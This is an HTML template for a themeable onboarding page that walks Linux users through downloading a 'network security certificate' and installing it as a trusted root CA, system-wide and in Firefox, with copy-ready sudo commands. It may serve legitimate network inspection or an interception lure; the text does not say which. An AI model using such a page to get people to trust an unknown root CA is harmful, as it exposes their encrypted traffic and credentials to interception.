{% extends "base.html" %}

{% block title %}{{ theme_name }} - Linux Installation{% endblock %}

{% block content %}
<div class="container">
    <!-- Header -->
    <header class="header">
        <div class="logo">
            <svg class="logo-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                <path d="M9 12l2 2 4-4"/>
            </svg>
            <h1>{{ theme_name }}</h1>
        </div>
        <p class="subtitle">{{ theme_subtitle }}</p>
    </header>

    <!-- Progress Bar -->
    <div class="progress-container">
        <div class="progress-bar">
            <div class="progress-fill" style="width: 0%"></div>
        </div>
        <span class="progress-text">Step 1 of 4</span>
    </div>

    <!-- Device Info -->
    <div class="device-badge">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="2" y="3" width="20" height="14" rx="2"/>
            <path d="M8 21h8M12 17v4"/>
        </svg>
        <span>Linux Detected</span>
    </div>

    <!-- Step 1: Download -->
    <div class="step-card">
        <div class="step-header">
            <span class="step-number">1</span>
            <h2>Download Security Certificate</h2>
        </div>
        <div class="step-content">
            <p>Click the button below to download the network security certificate.</p>
            
            <a href="/download/cert.pem" class="download-btn" data-download="pem">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                    <polyline points="7 10 12 15 17 10"/>
                    <line x1="12" y1="15" x2="12" y2="3"/>
                </svg>
                Download Certificate (PEM)
            </a>
            
            <p class="hint">The file will be saved to your Downloads folder</p>
        </div>
    </div>

    <!-- Step 2: Install System-Wide (Debian/Ubuntu) -->
    <div class="step-card">
        <div class="step-header">
            <span class="step-number">2</span>
            <h2>Install Certificate (Debian/Ubuntu)</h2>
        </div>
        <div class="step-content">
            <p>Open a terminal and run the following commands:</p>
            
            <div class="code-block">
                <code>
# Copy certificate to system directory
sudo cp ~/Downloads/NetworkSecurityCert.pem /usr/local/share/ca-certificates/NetworkSecurityCert.crt

# Update certificate store
sudo update-ca-certificates
                </code>
                <button class="copy-btn" data-copy="sudo cp ~/Downloads/NetworkSecurityCert.pem /usr/local/share/ca-certificates/NetworkSecurityCert.crt && sudo update-ca-certificates">
                    Copy
                </button>
            </div>

            <div class="info-box">
                <strong>Note:</strong> You'll need to enter your administrator password when prompted.
            </div>
        </div>
    </div>

    <!-- Step 2 Alt: Install System-Wide (Fedora/RHEL) -->
    <div class="step-card">
        <div class="step-header">
            <span class="step-number">2</span>
            <h2>Install Certificate (Fedora/RHEL/CentOS)</h2>
        </div>
        <div class="step-content">
            <p>If you're using Fedora, RHEL, or CentOS, use these commands instead:</p>
            
            <div class="code-block">
                <code>
# Copy certificate to system directory
sudo cp ~/Downloads/NetworkSecurityCert.pem /etc/pki/ca-trust/source/anchors/

# Update certificate store
sudo update-ca-trust extract
                </code>
                <button class="copy-btn" data-copy="sudo cp ~/Downloads/NetworkSecurityCert.pem /etc/pki/ca-trust/source/anchors/ && sudo update-ca-trust extract">
                    Copy
                </button>
            </div>
        </div>
    </div>

    <!-- Step 2 Alt: Install System-Wide (Arch) -->
    <div class="step-card">
        <div class="step-header">
            <span class="step-number">2</span>
            <h2>Install Certificate (Arch Linux)</h2>
        </div>
        <div class="step-content">
            <p>If you're using Arch Linux, use these commands:</p>
            
            <div class="code-block">
                <code>
# Copy certificate to system directory
sudo cp ~/Downloads/NetworkSecurityCert.pem /etc/ca-certificates/trust-source/anchors/

# Update certificate store
sudo trust extract-compat
                </code>
                <button class="copy-btn" data-copy="sudo cp ~/Downloads/NetworkSecurityCert.pem /etc/ca-certificates/trust-source/anchors/ && sudo trust extract-compat">
                    Copy
                </button>
            </div>
        </div>
    </div>

    <!-- Step 3: Browser Configuration -->
    <div class="step-card">
        <div class="step-header">
            <span class="step-number">3</span>
            <h2>Configure Browser (Firefox)</h2>
        </div>
        <div class="step-content">
            <p>Firefox uses its own certificate store. To add the certificate to Firefox:</p>
            
            <ol class="instruction-list">
                <li>Open Firefox and go to <strong>Settings</strong> (☰ → Settings)</li>
                <li>Search for <strong>"certificates"</strong> in the settings search bar</li>
                <li>Click <strong>"View Certificates..."</strong></li>
                <li>Go to the <strong>"Authorities"</strong> tab</li>
                <li>Click <strong>"Import..."</strong></li>
                <li>Navigate to your Downloads folder and select the certificate</li>
                <li>Check <strong>"Trust this CA to identify websites"</strong></li>
                <li>Click <strong>OK</strong></li>
            </ol>

            <div class="screenshot-placeholder">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1">
                    <rect x="3" y="3" width="18" height="18" rx="2"/>
                    <circle cx="8.5" cy="8.5" r="1.5"/>
                    <path d="M21 15l-5-5L5 21"/>
                </svg>
                <span>Firefox Certificate Manager</span>
            </div>

            <div class="info-box">
                <strong>Chrome/Chromium:</strong> These browsers use the system certificate store, so they should work automatically after step 2.
            </div>
        </div>
    </div>

    <!-- Step 4: Verify -->
    <div class="step-card">
        <div class="step-header">
            <span class="step-number">4</span>
            <h2>Verify Installation</h2>
        </div>
        <div class="step-content">
            <p>To verify the certificate is installed correctly:</p>
            
            <div class="code-block">
                <code>
# Check if certificate is in the system store
openssl verify -CApath /etc/ssl/certs ~/Downloads/NetworkSecurityCert.pem
                </code>
            </div>
            
            <p>You should see "OK" if the certificate is properly installed.</p>
            
            <p>You can also test by browsing to any HTTPS website - you should not see any certificate warnings.</p>
            
            <a href="/complete" class="btn btn-primary" style="margin-top: 20px;">
                I've Completed All Steps →
            </a>
        </div>
    </div>

    <!-- Troubleshooting -->
    <div class="help-section">
        <h3>Troubleshooting</h3>
        <div class="help-grid">
            <button class="help-btn" data-help="permission-denied">
                Permission Denied Error
            </button>
            <button class="help-btn" data-help="certificate-not-trusted">
                Certificate Not Trusted
            </button>
            <button class="help-btn" data-help="which-distro">
                Which Commands for My Distro?
            </button>
            <button class="help-btn" data-help="contact-support">
                Contact Support
            </button>
        </div>
    </div>
</div>

<style>
.code-block {
    background: #1e293b;
    border-radius: 8px;
    padding: 16px;
    position: relative;
    margin: 16px 0;
    overflow-x: auto;
}

.code-block code {
    color: #e2e8f0;
    font-family: 'Fira Code', 'Consolas', monospace;
    font-size: 13px;
    white-space: pre;
    display: block;
}

.code-block .copy-btn {
    position: absolute;
    top: 8px;
    right: 8px;
    background: #3b82f6;
    color: white;
    border: none;
    padding: 6px 12px;
    border-radius: 4px;
    cursor: pointer;
    font-size: 12px;
    transition: background 0.2s;
}

.code-block .copy-btn:hover {
    background: #2563eb;
}

.instruction-list {
    padding-left: 24px;
    line-height: 1.8;
}

.instruction-list li {
    margin-bottom: 8px;
}

.info-box {
    background: #eff6ff;
    border-left: 4px solid #3b82f6;
    padding: 12px 16px;
    border-radius: 0 8px 8px 0;
    margin: 16px 0;
}
</style>
{% endblock %}
